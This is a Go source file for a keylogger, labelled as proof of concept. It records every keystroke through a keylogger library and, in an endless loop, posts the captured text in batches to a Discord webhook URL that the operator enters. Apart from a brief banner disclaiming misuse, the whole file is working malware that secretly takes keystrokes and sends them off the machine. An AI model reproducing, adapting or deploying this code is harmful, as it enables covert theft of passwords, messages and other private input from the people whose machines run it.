package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/kindlyfire/go-keylogger"
)

const (
	delayfetch = 5
)

func main() {
	fmt.Println("SKIDS CAN FUCK OFF OUT OF HERE, THIS IS POC ONLY, xo#1111 ")
	my_logger := keylogger.NewKeylogger() // keylog obj
	//emptycount := 0
	var buffer bytes.Buffer // create buffer
	reader := bufio.NewReader(os.Stdin)
	fmt.Println("Enter your webhook url, this is for POC ONLY!")
	url, _ := reader.ReadString('\n')
	url = strings.Replace(url, "\n", "", -1) // clean the input
	url = strings.Replace(url, "\r", "", -1)

	for {
		//start := time.Now()
		key := my_logger.GetKey()
		if !key.Empty {
			buffer.WriteString(strconv.QuoteRune(key.Rune))
		}

		if len(buffer.String()) >= 1500 { // 1 char = 3 len, max send is 2k, 2*3 = 6, so gone with 5 to be safe
			type Payload struct {
				Username string `json:"username"`
				Content  string `json:"content"`
			}

			data := Payload{
				Username: "Keylog -> Discord",
				Content:  strings.Trim(buffer.String(), "'"),
			}

			payloadBytes, err := json.Marshal(data)
			if err != nil {
				fmt.Println(err)
			}
			body := bytes.NewReader(payloadBytes)

			req, err := http.NewRequest("POST", url, body)
			if err != nil {
				fmt.Println(err)
			}
			req.Header.Set("Content-Type", "application/json")

			resp, err := http.DefaultClient.Do(req)
			if err != nil {
				fmt.Println(err)
			}
			defer resp.Body.Close()
			buffer.Reset()
		}
		fmt.Printf("Current buffer content length : %d  Chars until sending : %d \n", len(buffer.String()), (1500-len(buffer.String()))/3)
		time.Sleep(delayfetch * time.Millisecond)
	}
}
